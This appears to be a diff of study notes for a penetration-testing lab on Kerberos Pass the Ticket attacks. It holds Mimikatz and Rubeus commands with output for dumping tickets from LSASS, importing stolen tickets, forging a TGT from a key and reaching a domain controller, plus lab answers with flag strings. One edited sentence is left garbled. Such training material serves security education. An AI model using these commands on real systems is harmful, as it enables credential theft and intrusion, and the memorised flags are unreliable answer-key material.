@@ -18,7 +18,6 @@ If the user wants to connect to an MSSQL database, it will request a `Ticket Gr
 
 ## Pass the Ticket (PtT) attack
 We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)` attack. It can be:
-
 - Service Ticket (TGS) to allow access to a particular resource.
 - Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
 
@@ -29,7 +28,7 @@ Let's imagine we are on a pentest, and we manage to phish a user and gain access
 
 ## Harvesting Kerberos tickets from Windows
 On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.
-We can harvest all tickets from a system using the `Mimikatz` module `sekurlsa::tickets /export`. The result is a list of files with the extension `.kirbi`, which contain the tickets.
+call tickets from a system using the `Mimikatz` module `sekurlsa::tickets /export`. The result is a list of files with the extension `.kirbi`, which contain the tickets.
 
 #### Mimikatz - Export tickets
 ```cmd
@@ -71,7 +70,7 @@ c:\tools> Rubeus.exe dump /nowrap
 
 This is a common way to retrieve tickets from a computer. Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let's see how we can do this using the `Pass the Key` aka. `OverPass the Hash` technique.
 
-## Pass the Key aka. OverPass the Hash
+## Pass the Key aka. OverPass the Hash (Convert Hash to TGT)
 The `Pass the Key` aka. `OverPass the Hash` approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket Granting Ticket` (`TGT`). This technique was developed by Benjamin Delpy and Skip Duckwall in their presentation [Abusing Microsoft Kerberos - Sorry you guys don't get it](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18). Also [Will Schroeder](https://twitter.com/harmj0y) adapted their project to create the [Rubeus](https://github.com/GhostPack/Rubeus) tool.
 
 To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`. This module will enumerate all key types present for the Kerberos package.
@@ -188,3 +187,134 @@ PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40
 doQAAAWfMIQAAAWZoIQAAAADAgEFoYQAAAADAgEWooQAAAQ5MIQAAAQzYYQAAAQtMIQAAAQnoIQAAAADAgEFoYQAAAAJGwdIVEIuQ09NooQAAAAsMIQAAAAmoIQAAAADAgECoYQAAAAXMIQAAAARGwZrcmJ0Z3QbB0hUQi5DT02jhAAAA9cwhAAAA9GghAAAAAMCARKhhAAAAAMCAQKihAAAA7kEggO1zqm0SuXewDEmypVORXzj8hyqSmikY9gxbM9xdpmA8r2EvTnv0UYkQFdf4B73Ss5ylutsSsyvnZYRVr8Ta9Wx/fvnjpJw/T70suDA4CgsuSZcBSo/jMnDjucWNtlDc8ez6...SNIP...
 ```
 Using Rubeus, we can perform a Pass the Ticket providing the Base64 string instead of the file name.
+
+#### Pass the Ticket - Base64 Format
+```cmd
+Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP...
+```
+
+Finally, we can also perform the Pass the Ticket attack using the Mimikatz module `kerberos::ptt` and the .kirbi file that contains the ticket we want to import.
+
+#### Mimikatz - Pass the Ticket
+```cmd
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+
+* File: 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi': OK
+mimikatz # exit
+Bye!
+
+c:\tools> dir \\DC01.inlanefreight.htb\c$
+
+Directory: \\dc01.inlanefreight.htb\c$
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         6/4/2022  11:17 AM                Program Files
+d-----         6/4/2022  11:17 AM                Program Files (x86)
+
+<SNIP>
+```
+**Note:** Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module `misc` to launch a new command prompt window with the imported ticket using the `misc::cmd` command.
+
+
+## Pass The Ticket with PowerShell Remoting (Windows)
+[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to run scripts or commands on a remote computer. Administrators often use PowerShell Remoting to manage remote computers on the network. Enabling PowerShell Remoting creates both HTTP and HTTPS listeners. The listener runs on standard port TCP/5985 for HTTP and TCP/5986 for HTTPS.
+
+To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.
+
+## Mimikatz - PowerShell Remoting with Pass the Ticket
+
+ Let's open a new `cmd.exe` and execute `mimikatz.exe`, then import the ticket we collected using `kerberos::ptt`. Once the ticket is imported into our `cmd.exe` session, we can launch a PowerShell command prompt from the same `cmd.exe` and use the command `Enter-PSSession` to connect to the target machine.
+#### Mimikatz - Pass the Ticket for lateral movement.
+```cmd-session
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+
+* File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK
+
+mimikatz # exit
+Bye!
+
+c:\tools>powershell
+Windows PowerShell
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\tools> Enter-PSSession -ComputerName DC01
+[DC01]: PS C:\Users\john\Documents> whoami
+inlanefreight\john
+```
+
+## Rubeus - PowerShell Remoting with Pass the Ticket
+Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). The process is hidden by default, but we can specify the flag `/show` to display the process, and the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.
+#### Create a sacrificial process with Rubeus
+```cmd-session
+C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+```
+The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting.
+
+#### Rubeus - Pass the Ticket for lateral movement
+```cmd-session
+C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+```
+```cmd-session
+c:\tools>powershell
+Windows PowerShell
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\tools> Enter-PSSession -ComputerName DC01
+[DC01]: PS C:\Users\john\Documents> whoami
+inlanefreight\john
+[DC01]: PS C:\Users\john\Documents> hostname
+DC01
+```
+
+### Diagram
+
+![[PassTheTicketDiagram.svg]]
+
+
+### Questions
+
+1.  Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?
+```shell
+Export tickets with mimikatz:
+
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+
+We can found 3 User krbtgt tickets.
+```
+
+2.  Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\DC01.inlanefreight.htb\john
+```shell
+C:\tools>.\Rubeus.exe ptt /ticket:"[0;45b43]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+
+C:\tools>type \\DC01.inlanefreight.htb\john\john.txt
+Learn1ng_M0r3_Tr1cks_with_J0hn
+```
+
+3. Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt
+```shell
+Use mimikatz:
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # kerberos::ptt "C:\tools\[0;45b43]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+* File: 'C:\tools\[0;45b43]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK
+
+mimikatz # exit
+
+
+C:\tools>powershell
+
+PS C:\tools> Enter-PSSession -ComputerName DC01
+
+[DC01]: PS C:\john> type john.txt
+P4$$_th3_Tick3T_PSR
+```
